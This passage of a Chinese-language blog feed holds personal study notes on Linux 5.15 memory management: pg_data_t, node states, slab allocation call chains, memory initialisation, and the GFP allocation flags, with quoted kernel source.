<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On NUMA machines, each NUMA node would have a pg_data_t to describe</span></span><br><span class="line"><span class="comment"> * it&#x27;s memory layout. On UMA machines there is a single pglist_data which</span></span><br><span class="line"><span class="comment"> * describes the whole memory.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Memory statistics and page replacement data structures are maintained on a</span></span><br><span class="line"><span class="comment"> * per-zone basis.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">pglist_data</span> &#123;</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * node_zones contains just the zones for THIS node. Not all of the</span></span><br><span class="line"><span class="comment">	 * zones may be populated, but it is the full list. It is referenced by</span></span><br><span class="line"><span class="comment">	 * this node&#x27;s node_zonelists as well as other node&#x27;s node_zonelists.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">zone</span> <span class="title">node_zones</span>[<span class="title">MAX_NR_ZONES</span>];</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * node_zonelists contains references to all zones in all nodes.</span></span><br><span class="line"><span class="comment">	 * Generally the first zones will be references to this node&#x27;s</span></span><br><span class="line"><span class="comment">	 * node_zones.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">zonelist</span> <span class="title">node_zonelists</span>[<span class="title">MAX_ZONELISTS</span>];</span></span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> nr_zones; <span class="comment">/* number of populated zones in this node */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_FLATMEM	<span class="comment">/* means !SPARSEMEM */</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">node_mem_map</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_PAGE_EXTENSION</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page_ext</span> *<span class="title">node_page_ext</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(CONFIG_MEMORY_HOTPLUG) || defined(CONFIG_DEFERRED_STRUCT_PAGE_INIT)</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Must be held any time you expect node_start_pfn,</span></span><br><span class="line"><span class="comment">	 * node_present_pages, node_spanned_pages or nr_zones to stay constant.</span></span><br><span class="line"><span class="comment">	 * Also synchronizes pgdat-&gt;first_deferred_pfn during deferred page</span></span><br><span class="line"><span class="comment">	 * init.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * pgdat_resize_lock() and pgdat_resize_unlock() are provided to</span></span><br><span class="line"><span class="comment">	 * manipulate node_size_lock without checking for CONFIG_MEMORY_HOTPLUG</span></span><br><span class="line"><span class="comment">	 * or CONFIG_DEFERRED_STRUCT_PAGE_INIT.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * Nests above zone-&gt;lock and zone-&gt;span_seqlock</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">spinlock_t</span> node_size_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> node_start_pfn;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> node_present_pages; <span class="comment">/* total number of physical pages */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> node_spanned_pages; <span class="comment">/* total size of physical page</span></span><br><span class="line"><span class="comment">					     range, including holes */</span></span><br><span class="line">	<span class="type">int</span> node_id;</span><br><span class="line">	<span class="type">wait_queue_head_t</span> kswapd_wait;</span><br><span class="line">	<span class="type">wait_queue_head_t</span> pfmemalloc_wait;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">kswapd</span>;</span>	<span class="comment">/* Protected by</span></span><br><span class="line"><span class="comment">					   mem_hotplug_begin/end() */</span></span><br><span class="line">	<span class="type">int</span> kswapd_order;</span><br><span class="line">	<span class="class"><span class="keyword">enum</span> <span class="title">zone_type</span> <span class="title">kswapd_highest_zoneidx</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> kswapd_failures;		<span class="comment">/* Number of &#x27;reclaimed == 0&#x27; runs */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_COMPACTION</span></span><br><span class="line">	<span class="type">int</span> kcompactd_max_order;</span><br><span class="line">	<span class="class"><span class="keyword">enum</span> <span class="title">zone_type</span> <span class="title">kcompactd_highest_zoneidx</span>;</span></span><br><span class="line">	<span class="type">wait_queue_head_t</span> kcompactd_wait;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">kcompactd</span>;</span></span><br><span class="line">	<span class="type">bool</span> proactive_compact_trigger;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * This is a per-node reserve of pages that are not available</span></span><br><span class="line"><span class="comment">	 * to userspace allocations.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>		totalreserve_pages;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * node reclaim becomes active if more unmapped pages exist.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>		min_unmapped_pages;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>		min_slab_pages;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* CONFIG_NUMA */</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Write-intensive fields used by page reclaim */</span></span><br><span class="line">	ZONE_PADDING(_pad1_)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEFERRED_STRUCT_PAGE_INIT</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If memory initialisation on large machines is deferred then this</span></span><br><span class="line"><span class="comment">	 * is the first PFN that needs to be initialised.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> first_deferred_pfn;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* CONFIG_DEFERRED_STRUCT_PAGE_INIT */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_TRANSPARENT_HUGEPAGE</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">deferred_split</span> <span class="title">deferred_split_queue</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Fields commonly accessed by the page reclaim scanner */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">NOTE:</span> THIS IS UNUSED IF MEMCG IS ENABLED.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * Use mem_cgroup_lruvec() to look up lruvecs.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">lruvec</span>		__<span class="title">lruvec</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>		flags;</span><br><span class="line"></span><br><span class="line">	ZONE_PADDING(_pad2_)</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Per-node vmstats */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">per_cpu_nodestat</span> __<span class="title">percpu</span> *<span class="title">per_cpu_nodestats</span>;</span></span><br><span class="line">	<span class="type">atomic_long_t</span>		vm_stat[NR_VM_NODE_STAT_ITEMS];</span><br><span class="line">&#125; <span class="type">pg_data_t</span>;</span><br></pre></td></tr></table></figure>

<h2 id="node-结构体管理（stat）"><a href="#node-结构体管理（stat）" class="headerlink" title="node 结构体管理（stat）"></a>node 结构体管理（stat）</h2><blockquote>
<p>位图中的每一位代表一个节点，stat是个数组，每个元素代表不同状态的节点数量。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> DECLARE_BITMAP(name,bits) \</span></span><br><span class="line"><span class="meta">	unsigned long name[BITS_TO_LONGS(bits)]</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span> DECLARE_BITMAP(bits, MAX_NUMNODES); &#125; <span class="type">nodemask_t</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">nodemask_t</span> _unused_nodemask_arg_;</span><br><span class="line">.....................</span><br><span class="line"> * Bitmasks that are kept <span class="keyword">for</span> all the nodes.</span><br><span class="line"> */</span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">node_states</span> &#123;</span></span><br><span class="line">	N_POSSIBLE,		<span class="comment">/* The node could become online at some point */</span></span><br><span class="line">	N_ONLINE,		<span class="comment">/* The node is online */</span></span><br><span class="line">	N_NORMAL_MEMORY,	<span class="comment">/* The node has regular memory */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_HIGHMEM</span></span><br><span class="line">	N_HIGH_MEMORY,		<span class="comment">/* The node has regular or high memory */</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">	N_HIGH_MEMORY = N_NORMAL_MEMORY,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	N_MEMORY,		<span class="comment">/* The node has memory(regular, high, movable) */</span></span><br><span class="line">	N_CPU,		<span class="comment">/* The node has one or more cpus */</span></span><br><span class="line">	N_GENERIC_INITIATOR,	<span class="comment">/* The node has one or more Generic Initiators */</span></span><br><span class="line">	NR_NODE_STATES</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The following particular system nodemasks and operations</span></span><br><span class="line"><span class="comment"> * on them manage all possible and online nodes.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">nodemask_t</span> node_states[NR_NODE_STATES];</span><br></pre></td></tr></table></figure>



<h1 id="内存分配"><a href="#内存分配" class="headerlink" title="内存分配"></a>内存分配</h1><blockquote>
<p>目前只知道两个，一种伙伴算法，一种slab分配器的小内存分配。</p>
<p>基本上所有的物理内存分配完都会进行mmu映射，不会直接使用物理内存，但是内存管理的时候是使用物理内存的，slab会保存物理地址与虚拟地址之间的映射，分配时会分配虚拟地址。</p>
<p>接下来学习slab分配器</p>
<p>以一些关键函数的实现过程为主线：</p>
</blockquote>
<h3 id="1-create-cache"><a href="#1-create-cache" class="headerlink" title="1. create_cache"></a>1. create_cache</h3><blockquote>
<p>涉及数据结构（根据所用分配器的不同而不同）</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span>;</span><span class="comment">//分配的cache</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span>;</span><span class="comment">//每个节点相关联的数据结构，其中有单个node维护的一组slab</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">array_cache</span>;</span><span class="comment">//单个cpu缓存</span></span><br><span class="line">注：cpu可跨节点，一个节点也可以供多个cpu访问</span><br></pre></td></tr></table></figure>

<blockquote>
<p>函数调用链：</p>
</blockquote>
<blockquote>
<p><code>create_cache</code>-&gt;<code>kmem_cache_zalloc</code>,<code>__kmem_cache_create</code></p>
<p><code>kmem_cache_zalloc</code>-&gt;<code>kmem_cache_alloc</code>-&gt;<code>slab_alloc</code>-&gt;<code>__do_cache_alloc</code>-&gt;<code>__do_cache_alloc</code>-&gt;<code>__do_cache_alloc</code></p>
<p><code>kmem_cache_zalloc</code>主要用来为cache分配相应的slab，和可分配内存，也可以分配cache的结构体，通过全局的缓存池。</p>
<p><code>__kmem_cache_create</code>主要用来建立SLAB缓存池，管理cache。</p>
</blockquote>
]]></content>
      <categories>
        <category>linux内核</category>
        <category>5.15</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>linux5.15之page</title>
    <url>/2024/09/16/linux%E5%86%85%E6%A0%B8/linux5.15%E5%88%86%E6%9E%90/%E5%85%B3%E4%BA%8Epage/</url>
    <content><![CDATA[<blockquote>
<p>主要讨论了page的管理方式，搭配不同的内存模型，应该是比较底层的部分，此部分学习主要是参考了前人的文章，主要还是先理解如何管理吧，初始化等部分和架构结合的比较紧密，需要看汇编了，一步一步来。</p>
</blockquote>
<h2 id="文章"><a href="#文章" class="headerlink" title="文章"></a>文章</h2><p><a href="https://mp.weixin.qq.com/s/CZW7kjeyDrDOmF8hjnyw0Q">https://mp.weixin.qq.com/s/CZW7kjeyDrDOmF8hjnyw0Q</a></p>
<p><a href="https://arttnba3.cn/2021/11/28/OS-0X02-LINUX-KERNEL-MEMORY-5.11-PART-I/#Sparse-Memory">https://arttnba3.cn/2021/11/28/OS-0X02-LINUX-KERNEL-MEMORY-5.11-PART-I/#Sparse-Memory</a></p>
]]></content>
      <categories>
        <category>linux内核</category>
        <category>5.15</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>linux5.15之内存管理初始化（x86）</title>
    <url>/2024/09/16/linux%E5%86%85%E6%A0%B8/linux5.15%E5%88%86%E6%9E%90/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E4%B9%8B%E5%88%9D%E5%A7%8B%E5%8C%96/</url>
    <content><![CDATA[<p>主初始化函数在main.c中，主要研究以下几个部分：</p>
<p>1.node的初始化</p>
<p>2.zone的空间分配</p>
<p>3.node的zonelist的初始化</p>
<h2 id="blog"><a href="#blog" class="headerlink" title="blog"></a>blog</h2><blockquote>
<p><a href="https://7r1pl3j.github.io/2022/11/17/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/#Linux-%E4%B8%89%E7%A7%8D%E5%86%85%E5%AD%98%E6%A8%A1%E5%9E%8B">https://7r1pl3j.github.io/2022/11/17/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/#Linux-%E4%B8%89%E7%A7%8D%E5%86%85%E5%AD%98%E6%A8%A1%E5%9E%8B</a></p>
<p>终于是理解了node，zone，pfn以及page。</p>
</blockquote>
<h2 id="setup-arch-command-line"><a href="#setup-arch-command-line" class="headerlink" title="setup_arch(&amp;command_line)"></a>setup_arch(&amp;command_line)</h2><blockquote>
<p>涉及到cpu与node之间关系的建立以及，node与内存之间映射关系的建立</p>
<p>在建立关系之前需要有一个分配器来完成内存的分配，因此需要bootstrap，需要先初始化一个笨重的分配器，来进行最初的内存分配，直到高级的分配器完全建立。</p>
<p>涉及部分数据结构如下：</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//分别是获得io，和分配节点的部分代码</span></span><br><span class="line">u16 *cpu_to_apicid = early_per_cpu_ptr(x86_cpu_to_apicid);</span><br><span class="line">cpu_to_node_map[cpu] = node;</span><br><span class="line">.............</span><br><span class="line"><span class="comment">/*node，zone初始化的主要代码，过于长*/</span></span><br><span class="line">init_cpu_to_node();</span><br><span class="line">init_gi_nodes();</span><br></pre></td></tr></table></figure>

<h2 id="build-all-zonelists"><a href="#build-all-zonelists" class="headerlink" title="build_all_zonelists"></a>build_all_zonelists</h2><blockquote>
<p>此函数第一部分来设置zonelists列表，node在初始化的过程中通过node_zones字段来引用内存但是还不能被使用，需要通过初始化zonelist之后才能使用，初始化zonelist分为热插拔和初始化两种情况。</p>
<p>其中涉及到的主要的操作如下：</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//用来定位zone</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zoneref</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">zone</span> *<span class="title">zone</span>;</span>	<span class="comment">/* Pointer to actual zone */</span></span><br><span class="line">	<span class="type">int</span> zone_idx;		<span class="comment">/* zone_idx(zoneref-&gt;zone) */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//例子：</span></span><br><span class="line"><span class="comment">//指向当前节点的 zonelist，_zonerefs 是用于存储内存区域（zone）的数据结构。</span></span><br><span class="line">zonerefs = pgdat-&gt;node_zonelists[ZONELIST_FALLBACK]._zonerefs;</span><br><span class="line"><span class="comment">//用来定位node</span></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">pglist_data</span> <span class="title">contig_page_data</span>;</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="keyword">struct</span> pglist_data *<span class="title function_">NODE_DATA</span><span class="params">(<span class="type">int</span> nid)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> &amp;contig_page_data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>此函数第二部分来设置vm_total_pages，Get the number of free pages beyond high watermark in all zones. </p>
<p>进而考虑是否需要禁止mobile来减少内存碎片（如果内存较少就没有必要开启此功能。）</p>
</blockquote>
<h2 id="mm-init"><a href="#mm-init" class="headerlink" title="mm_init"></a>mm_init</h2><blockquote>
<p>内容好多，先研究slab初始化吧</p>
</blockquote>
<h3 id="kmem-cache-init-void"><a href="#kmem-cache-init-void" class="headerlink" title="kmem_cache_init(void)"></a>kmem_cache_init(void)</h3>]]></content>
      <categories>
        <category>linux内核</category>
        <category>5.15</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>linux5.15之page分配</title>
    <url>/2024/09/20/linux%E5%86%85%E6%A0%B8/linux5.15%E5%88%86%E6%9E%90/%E5%85%B3%E4%BA%8Epage%E5%88%86%E9%85%8D/</url>
    <content><![CDATA[<p>本文按照Linux内核深度解析为主线，做的一些总结和梳理</p>
<h2 id="1-关于内存分分配标志"><a href="#1-关于内存分分配标志" class="headerlink" title="1.关于内存分分配标志"></a>1.关于内存分分配标志</h2><blockquote>
<p>参考gfp.h</p>
</blockquote>
<h3 id="1-1一些掩码"><a href="#1-1一些掩码" class="headerlink" title="1.1一些掩码"></a>1.1一些掩码</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Plain integer GFP bitmasks. Do not use this directly. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ___GFP_DMA		0x01u</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ___GFP_HIGHMEM		0x02u</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ___GFP_DMA32		0x04u</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ___GFP_MOVABLE		0x08u</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ___GFP_RECLAIMABLE	0x10u</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ___GFP_HIGH		0x20u</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ___GFP_IO		0x40u</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ___GFP_FS		0x80u</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ___GFP_ZERO		0x100u</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ___GFP_ATOMIC		0x200u</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ___GFP_DIRECT_RECLAIM	0x400u</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ___GFP_KSWAPD_RECLAIM	0x800u</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ___GFP_WRITE		0x1000u</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ___GFP_NOWARN		0x2000u</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ___GFP_RETRY_MAYFAIL	0x4000u</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ___GFP_NOFAIL		0x8000u</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ___GFP_NORETRY		0x10000u</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ___GFP_MEMALLOC		0x20000u</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ___GFP_COMP		0x40000u</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ___GFP_NOMEMALLOC	0x80000u</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ___GFP_HARDWALL		0x100000u</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ___GFP_THISNODE		0x200000u</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ___GFP_ACCOUNT		0x400000u</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ___GFP_ZEROTAGS		0x800000u</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ___GFP_SKIP_KASAN_POISON	0x1000000u</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_LOCKDEP</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ___GFP_NOLOCKDEP	0x2000000u</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ___GFP_NOLOCKDEP	0</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<h3 id="1-2掩码分类"><a href="#1-2掩码分类" class="headerlink" title="1.2掩码分类"></a>1.2掩码分类</h3><h4 id="1-内存分配区域标志（Zone-Modifiers）"><a href="#1-内存分配区域标志（Zone-Modifiers）" class="headerlink" title="1. 内存分配区域标志（Zone Modifiers）"></a>1. <strong>内存分配区域标志（Zone Modifiers）</strong></h4><p>这些标志定义了内存分配的物理地址区域：</p>
<ul>
<li><code>__GFP_DMA</code>: 分配内存时，只使用低 16MB 的内存区域，这个标志主要用于设备 DMA 需要低地址的情况。</li>
<li><code>__GFP_DMA32</code>: 分配内存时，只使用低 4GB 的内存，适用于需要 32 位地址设备的情况。</li>
<li><code>__GFP_HIGHMEM</code>: 分配高端内存（用于 32 位系统的扩展内存）。</li>
<li><code>__GFP_MOVABLE</code>: 可移动的页面，用于内存压缩和回收。</li>
</ul>
<p>组合标志：</p>
<ul>
<li><code>GFP_ZONEMASK</code>: 用于组合所有内存区域相关的标志。</li>
</ul>
<h4 id="2-页面移动性和位置提示标志"><a href="#2-页面移动性和位置提示标志" class="headerlink" title="2. 页面移动性和位置提示标志"></a>2. <strong>页面移动性和位置提示标志</strong></h4><p>这些标志控制页面是否可以在内存压缩或回收时移动：</p>
<ul>
<li><code>__GFP_RECLAIMABLE</code>: 这些页面可以通过内核的回收机制回收。</li>
<li><code>__GFP_WRITE</code>: 申请者可能会对页面进行写操作。</li>
<li><code>__GFP_HARDWALL</code>: 强制执行内存分配的 <code>cpuset</code> 约束。</li>
<li><code>__GFP_THISNODE</code>: 强制在指定的 NUMA 节点上分配内存，禁止使用其他节点。</li>
<li><code>__GFP_ACCOUNT</code>: 分配的内存将被记账到 <code>kmemcg</code>（内核内存控制组）。</li>
</ul>
<h4 id="3-水印修改标志"><a href="#3-水印修改标志" class="headerlink" title="3. 水印修改标志"></a>3. <strong>水印修改标志</strong></h4><p>这些标志控制对系统应急保留内存的访问：</p>
<ul>
<li><code>__GFP_HIGH</code>: 高优先级分配请求，用于系统的关键任务。</li>
<li><code>__GFP_ATOMIC</code>: 分配过程不能阻塞或睡眠，常用于中断处理程序。</li>
<li><code>__GFP_MEMALLOC</code>: 允许访问系统的所有内存，包括应急保留区。</li>
<li><code>__GFP_NOMEMALLOC</code>: 明确禁止访问应急保留区，即使设置了 <code>__GFP_MEMALLOC</code>。</li>
</ul>
<h4 id="4-回收修改标志"><a href="#4-回收修改标志" class="headerlink" title="4. 回收修改标志"></a>4. <strong>回收修改标志</strong></h4><p>这些标志控制内核如何处理内存回收：</p>
<ul>
<li><code>__GFP_IO</code>: 分配内存时允许进行物理 I&#x2F;O 操作。</li>
<li><code>__GFP_FS</code>: 允许调用底层文件系统来分配内存。</li>
<li><code>__GFP_DIRECT_RECLAIM</code>: 允许申请者进入直接内存回收状态。</li>
<li><code>__GFP_KSWAPD_RECLAIM</code>: 在达到低水位线时唤醒 <code>kswapd</code> 进行内存回收。</li>
<li><code>__GFP_NORETRY</code>: 避免执行耗时的回收操作，快速返回。</li>
<li><code>__GFP_RETRY_MAYFAIL</code>: 允许在内存压力下重试，但分配失败是可能的。</li>
<li><code>__GFP_NOFAIL</code>: 内存分配必须成功，禁止失败。</li>
</ul>
<h4 id="5-操作修改标志"><a href="#5-操作修改标志" class="headerlink" title="5. 操作修改标志"></a>5. <strong>操作修改标志</strong></h4><p>这些标志提供了与内存操作相关的特殊功能：</p>
<ul>
<li><code>__GFP_NOWARN</code>: 抑制内存分配失败的警告信息。</li>
<li><code>__GFP_COMP</code>: 用于复合页面（多个物理页面的组合）。</li>
<li><code>__GFP_ZERO</code>: 返回一个已清零的页面。</li>
<li><code>__GFP_ZEROTAGS</code>: 返回已清零的内存标签。</li>
</ul>
<h4 id="6-常用-GFP-标志组合"><a href="#6-常用-GFP-标志组合" class="headerlink" title="6. 常用 GFP 标志组合"></a>6. <strong>常用 GFP 标志组合</strong></h4><ul>
<li><code>GFP_ATOMIC</code>: 不允许睡眠，必须分配成功，通常用于中断上下文。</li>
<li><code>GFP_KERNEL</code>: 用于内核内部的典型分配，允许进入回收状态。</li>
<li><code>GFP_NOWAIT</code>: 不允许分配过程中进入回收或 I&#x2F;O。</li>
<li><code>GFP_NOIO</code>: 允许回收但不进行任何 I&#x2F;O 操作。</li>
<li><code>GFP_NOFS</code>: 允许回收但不进行文件系统的调用。</li>
<li><code>GFP_USER</code>: 用于用户空间分配，通常是直接可访问的内存。</li>
</ul>
<h3 id="1-3-区域选择"><a href="#1-3-区域选择" class="headerlink" title="1.3 区域选择"></a>1.3 区域选择</h3><blockquote>
<p>共有16种可能性。</p>
<p>有个table，将可能被选的分配到16个区域。</p>
<p>通过page的flag（取低四位），将table右移动flag*区域长度，取低四位（区域长度），则可得到对应应该分配到哪个区域。</p>
<p>当然也有无效区域，因此需要<code>VM_BUG_ON((GFP_ZONE_BAD &gt;&gt; bit) &amp; 1);</code></p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * GFP_ZONE_TABLE is a word size bitstring that is used for looking up the</span></span><br><span class="line"><span class="comment"> * zone to use given the lowest 4 bits of gfp_t. Entries are GFP_ZONES_SHIFT</span></span><br><span class="line"><span class="comment"> * bits long and there are 16 of them to cover all possible combinations of</span></span><br><span class="line"><span class="comment"> * __GFP_DMA, __GFP_DMA32, __GFP_MOVABLE and __GFP_HIGHMEM.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The zone fallback order is MOVABLE=&gt;HIGHMEM=&gt;NORMAL=&gt;DMA32=&gt;DMA.</span></span><br><span class="line"><span class="comment"> * But GFP_MOVABLE is not only a zone specifier but also an allocation</span></span><br><span class="line"><span class="comment"> * policy. Therefore __GFP_MOVABLE plus another zone selector is valid.</span></span><br><span class="line"><span class="comment"> * Only 1 bit of the lowest 3 bits (DMA,DMA32,HIGHMEM) can be set to &quot;1&quot;.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *       bit       result</span></span><br><span class="line"><span class="comment"> *       =================</span></span><br><span class="line"><span class="comment"> *       0x0    =&gt; NORMAL</span></span><br><span class="line"><span class="comment"> *       0x1    =&gt; DMA or NORMAL</span></span><br><span class="line"><span class="comment"> *       0x2    =&gt; HIGHMEM or NORMAL</span></span><br><span class="line"><span class="comment"> *       0x3    =&gt; BAD (DMA+HIGHMEM)</span></span><br><span class="line"><span class="comment"> *       0x4    =&gt; DMA32 or NORMAL</span></span><br><span class="line"><span class="comment"> *       0x5    =&gt; BAD (DMA+DMA32)</span></span><br><span class="line"><span class="comment"> *       0x6    =&gt; BAD (HIGHMEM+DMA32)</span></span><br><span class="line"><span class="comment"> *       0x7    =&gt; BAD (HIGHMEM+DMA32+DMA)</span></span><br><span class="line"><span class="comment"> *       0x8    =&gt; NORMAL (MOVABLE+0)</span></span><br><span class="line"><span class="comment"> *       0x9    =&gt; DMA or NORMAL (MOVABLE+DMA)</span></span><br><span class="line"><span class="comment"> *       0xa    =&gt; MOVABLE (Movable is valid only if HIGHMEM is set too)</span></span><br><span class="line"><span class="comment"> *       0xb    =&gt; BAD (MOVABLE+HIGHMEM+DMA)</span></span><br><span class="line"><span class="comment"> *       0xc    =&gt; DMA32 or NORMAL (MOVABLE+DMA32)</span></span><br><span class="line"><span class="comment"> *       0xd    =&gt; BAD (MOVABLE+DMA32+DMA)</span></span><br><span class="line"><span class="comment"> *       0xe    =&gt; BAD (MOVABLE+DMA32+HIGHMEM)</span></span><br><span class="line"><span class="comment"> *       0xf    =&gt; BAD (MOVABLE+DMA32+HIGHMEM+DMA)</span></span><br><span class="line"><span 